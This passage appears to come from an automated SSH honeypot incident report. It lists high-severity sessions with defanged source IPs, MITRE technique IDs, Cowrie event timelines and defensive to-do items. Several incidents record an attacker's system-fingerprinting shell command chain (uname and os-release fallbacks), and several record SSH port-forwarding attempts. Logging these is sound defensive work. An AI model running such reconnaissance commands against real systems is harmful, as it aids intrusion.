| `2026-07-15 19:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3d290806f96

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:49 |
| **Last Seen** | 2026-07-15 19:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:49:46` | `cowrie.session.connect` |
| `2026-07-15 19:49:46` | `cowrie.client.version` |
| `2026-07-15 19:49:46` | `cowrie.client.kex` |
| `2026-07-15 19:49:46` | `cowrie.login.success` |
| `2026-07-15 19:49:47` | `cowrie.session.params` |
| `2026-07-15 19:49:47` | `cowrie.command.input` |
| `2026-07-15 19:49:47` | `cowrie.command.input` |
| `2026-07-15 19:49:47` | `cowrie.command.input` |
| `2026-07-15 19:49:47` | `cowrie.command.input` |
| `2026-07-15 19:49:47` | `cowrie.command.input` |
| `2026-07-15 19:49:47` | `cowrie.command.success` |
| `2026-07-15 19:49:47` | `cowrie.command.input` |
| `2026-07-15 19:49:47` | `cowrie.command.input` |
| `2026-07-15 19:49:47` | `cowrie.command.input` |
| `2026-07-15 19:49:47` | `cowrie.command.input` |
| `2026-07-15 19:49:47` | `cowrie.log.closed` |
| `2026-07-15 19:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c9ecadd557f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:52 |
| **Last Seen** | 2026-07-15 19:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:52:54` | `cowrie.session.connect` |
| `2026-07-15 19:52:54` | `cowrie.client.version` |
| `2026-07-15 19:52:54` | `cowrie.client.kex` |
| `2026-07-15 19:52:56` | `cowrie.login.success` |
| `2026-07-15 19:52:57` | `cowrie.session.params` |
| `2026-07-15 19:52:57` | `cowrie.command.input` |
| `2026-07-15 19:52:57` | `cowrie.command.input` |
| `2026-07-15 19:52:57` | `cowrie.command.input` |
| `2026-07-15 19:52:57` | `cowrie.command.input` |
| `2026-07-15 19:52:57` | `cowrie.command.input` |
| `2026-07-15 19:52:57` | `cowrie.command.success` |
| `2026-07-15 19:52:57` | `cowrie.command.input` |
| `2026-07-15 19:52:57` | `cowrie.command.input` |
| `2026-07-15 19:52:57` | `cowrie.command.input` |
| `2026-07-15 19:52:57` | `cowrie.command.input` |
| `2026-07-15 19:52:57` | `cowrie.log.closed` |
| `2026-07-15 19:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42cf52a6fc04

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:55 |
| **Last Seen** | 2026-07-15 19:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:55:02` | `cowrie.session.connect` |
| `2026-07-15 19:55:02` | `cowrie.client.version` |
| `2026-07-15 19:55:03` | `cowrie.client.kex` |
| `2026-07-15 19:55:03` | `cowrie.login.success` |
| `2026-07-15 19:55:04` | `cowrie.session.params` |
| `2026-07-15 19:55:04` | `cowrie.command.input` |
| `2026-07-15 19:55:04` | `cowrie.command.input` |
| `2026-07-15 19:55:04` | `cowrie.command.input` |
| `2026-07-15 19:55:04` | `cowrie.command.input` |
| `2026-07-15 19:55:04` | `cowrie.command.input` |
| `2026-07-15 19:55:04` | `cowrie.command.success` |
| `2026-07-15 19:55:04` | `cowrie.command.input` |
| `2026-07-15 19:55:04` | `cowrie.command.input` |
| `2026-07-15 19:55:04` | `cowrie.command.input` |
| `2026-07-15 19:55:04` | `cowrie.command.input` |
| `2026-07-15 19:55:04` | `cowrie.log.closed` |
| `2026-07-15 19:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed757d2465da

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:56 |
| **Last Seen** | 2026-07-15 19:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:56:44` | `cowrie.session.connect` |
| `2026-07-15 19:56:44` | `cowrie.client.version` |
| `2026-07-15 19:56:44` | `cowrie.client.kex` |
| `2026-07-15 19:56:46` | `cowrie.login.success` |
| `2026-07-15 19:56:47` | `cowrie.session.params` |
| `2026-07-15 19:56:47` | `cowrie.command.input` |
| `2026-07-15 19:56:47` | `cowrie.command.input` |
| `2026-07-15 19:56:47` | `cowrie.command.input` |
| `2026-07-15 19:56:47` | `cowrie.command.input` |
| `2026-07-15 19:56:47` | `cowrie.command.input` |
| `2026-07-15 19:56:47` | `cowrie.command.success` |
| `2026-07-15 19:56:47` | `cowrie.command.input` |
| `2026-07-15 19:56:47` | `cowrie.command.input` |
| `2026-07-15 19:56:47` | `cowrie.command.input` |
| `2026-07-15 19:56:47` | `cowrie.command.input` |
| `2026-07-15 19:56:47` | `cowrie.log.closed` |
| `2026-07-15 19:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac28d0bce45a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:58 |
| **Last Seen** | 2026-07-15 19:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:58:37` | `cowrie.session.connect` |
| `2026-07-15 19:58:37` | `cowrie.client.version` |
| `2026-07-15 19:58:37` | `cowrie.client.kex` |
| `2026-07-15 19:58:38` | `cowrie.login.success` |
| `2026-07-15 19:58:40` | `cowrie.session.params` |
| `2026-07-15 19:58:40` | `cowrie.command.input` |
| `2026-07-15 19:58:40` | `cowrie.command.input` |
| `2026-07-15 19:58:40` | `cowrie.command.input` |
| `2026-07-15 19:58:40` | `cowrie.command.input` |
| `2026-07-15 19:58:40` | `cowrie.command.input` |
| `2026-07-15 19:58:40` | `cowrie.command.success` |
| `2026-07-15 19:58:40` | `cowrie.command.input` |
| `2026-07-15 19:58:40` | `cowrie.command.input` |
| `2026-07-15 19:58:40` | `cowrie.command.input` |
| `2026-07-15 19:58:40` | `cowrie.command.input` |
| `2026-07-15 19:58:40` | `cowrie.log.closed` |
| `2026-07-15 19:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8fa9748096

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 19:59 |
| **Last Seen** | 2026-07-15 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:59:54` | `cowrie.session.connect` |
| `2026-07-15 19:59:54` | `cowrie.client.version` |
| `2026-07-15 19:59:54` | `cowrie.client.kex` |
| `2026-07-15 19:59:54` | `cowrie.login.success` |
| `2026-07-15 19:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba45f4d9c999

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 19:59 |
| **Last Seen** | 2026-07-15 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:59:54` | `cowrie.session.connect` |
| `2026-07-15 19:59:54` | `cowrie.client.version` |
| `2026-07-15 19:59:54` | `cowrie.client.kex` |
| `2026-07-15 19:59:54` | `cowrie.login.success` |
| `2026-07-15 19:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-074c5dff8158

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 19:59 |
| **Last Seen** | 2026-07-15 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:59:57` | `cowrie.session.connect` |
| `2026-07-15 19:59:57` | `cowrie.client.version` |
| `2026-07-15 19:59:57` | `cowrie.client.kex` |
| `2026-07-15 19:59:57` | `cowrie.login.success` |
| `2026-07-15 19:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1515ebc942f2

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 19:59 |
| **Last Seen** | 2026-07-15 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:59:57` | `cowrie.session.connect` |
| `2026-07-15 19:59:57` | `cowrie.client.version` |
| `2026-07-15 19:59:57` | `cowrie.client.kex` |
| `2026-07-15 19:59:57` | `cowrie.login.success` |
| `2026-07-15 19:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5c647426681

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-07-15 20:00 |
| **Last Seen** | 2026-07-15 20:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:00:15` | `cowrie.session.connect` |
| `2026-07-15 20:00:16` | `cowrie.client.version` |
| `2026-07-15 20:00:16` | `cowrie.client.kex` |
| `2026-07-15 20:00:17` | `cowrie.login.success` |
| `2026-07-15 20:00:18` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:00:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b409a6f1671

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-07-15 20:01 |
| **Last Seen** | 2026-07-15 20:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:01:02` | `cowrie.session.connect` |
| `2026-07-15 20:01:03` | `cowrie.client.version` |
| `2026-07-15 20:01:03` | `cowrie.client.kex` |
| `2026-07-15 20:01:06` | `cowrie.login.success` |
| `2026-07-15 20:01:07` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-040b112b7079

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-07-15 20:01 |
| **Last Seen** | 2026-07-15 20:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:01:12` | `cowrie.session.connect` |
| `2026-07-15 20:01:13` | `cowrie.client.version` |
| `2026-07-15 20:01:13` | `cowrie.client.kex` |
| `2026-07-15 20:01:16` | `cowrie.login.success` |
| `2026-07-15 20:01:17` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:01:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a839b7562213

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 20:01 |
| **Last Seen** | 2026-07-15 20:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:01:18` | `cowrie.session.connect` |
| `2026-07-15 20:01:18` | `cowrie.client.version` |
| `2026-07-15 20:01:18` | `cowrie.client.kex` |
| `2026-07-15 20:01:19` | `cowrie.login.success` |
| `2026-07-15 20:01:20` | `cowrie.session.params` |
| `2026-07-15 20:01:20` | `cowrie.command.input` |
| `2026-07-15 20:01:20` | `cowrie.log.closed` |
| `2026-07-15 20:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aa2e7f72b12

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]92` |
| **First Seen** | 2026-07-15 20:01 |
| **Last Seen** | 2026-07-15 20:01 |
| **Session Duration** | 23s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:01:26` | `cowrie.session.connect` |
| `2026-07-15 20:01:26` | `cowrie.client.version` |
| `2026-07-15 20:01:26` | `cowrie.client.kex` |
| `2026-07-15 20:01:28` | `cowrie.client.fingerprint` |
| `2026-07-15 20:01:28` | `cowrie.login.failed` |
| `2026-07-15 20:01:28` | `cowrie.login.success` |
| `2026-07-15 20:01:49` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:01:49` | `cowrie.direct-tcpip.ja4` |
| `2026-07-15 20:01:49` | `cowrie.direct-tcpip.data` |
| `2026-07-15 20:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]92` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81081788ada2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 20:01 |
| **Last Seen** | 2026-07-15 20:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:01:27` | `cowrie.session.connect` |
| `2026-07-15 20:01:27` | `cowrie.client.version` |
| `2026-07-15 20:01:27` | `cowrie.client.kex` |
| `2026-07-15 20:01:28` | `cowrie.login.success` |
| `2026-07-15 20:01:29` | `cowrie.session.params` |
| `2026-07-15 20:01:29` | `cowrie.command.input` |
| `2026-07-15 20:01:29` | `cowrie.command.input` |
| `2026-07-15 20:01:29` | `cowrie.command.input` |
| `2026-07-15 20:01:29` | `cowrie.command.input` |
| `2026-07-15 20:01:29` | `cowrie.command.input` |
| `2026-07-15 20:01:29` | `cowrie.command.success` |
| `2026-07-15 20:01:29` | `cowrie.command.input` |
| `2026-07-15 20:01:29` | `cowrie.command.input` |
| `2026-07-15 20:01:29` | `cowrie.command.input` |
| `2026-07-15 20:01:29` | `cowrie.command.input` |
| `2026-07-15 20:01:29` | `cowrie.log.closed` |
| `2026-07-15 20:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-866dc046cecc

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-15 20:02 |
| **Last Seen** | 2026-07-15 20:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:02:57` | `cowrie.session.connect` |
| `2026-07-15 20:02:57` | `cowrie.client.version` |
| `2026-07-15 20:02:58` | `cowrie.client.kex` |
| `2026-07-15 20:02:58` | `cowrie.login.success` |
| `2026-07-15 20:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-474887971abf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 20:04 |
| **Last Seen** | 2026-07-15 20:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:04:11` | `cowrie.session.connect` |
| `2026-07-15 20:04:11` | `cowrie.client.version` |
| `2026-07-15 20:04:11` | `cowrie.client.kex` |
| `2026-07-15 20:04:11` | `cowrie.login.success` |
| `2026-07-15 20:04:12` | `cowrie.session.params` |
| `2026-07-15 20:04:12` | `cowrie.command.input` |
| `2026-07-15 20:04:12` | `cowrie.command.input` |
| `2026-07-15 20:04:12` | `cowrie.command.input` |
| `2026-07-15 20:04:12` | `cowrie.command.input` |
| `2026-07-15 20:04:12` | `cowrie.command.input` |
| `2026-07-15 20:04:12` | `cowrie.command.success` |
| `2026-07-15 20:04:12` | `cowrie.command.input` |
| `2026-07-15 20:04:12` | `cowrie.command.input` |
| `2026-07-15 20:04:12` | `cowrie.command.input` |
| `2026-07-15 20:04:12` | `cowrie.command.input` |
| `2026-07-15 20:04:12` | `cowrie.log.closed` |
| `2026-07-15 20:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fca94821ee0

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-07-15 20:04 |
| **Last Seen** | 2026-07-15 20:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:04:33` | `cowrie.session.connect` |
| `2026-07-15 20:04:34` | `cowrie.client.version` |
| `2026-07-15 20:04:34` | `cowrie.client.kex` |
| `2026-07-15 20:04:37` | `cowrie.login.success` |
| `2026-07-15 20:04:38` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a4108d9e770

| Field | Detail |
|---|---|
| **Source IP** | `58.17.6[.]119` |
| **First Seen** | 2026-07-15 20:04 |
| **Last Seen** | 2026-07-15 20:04 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
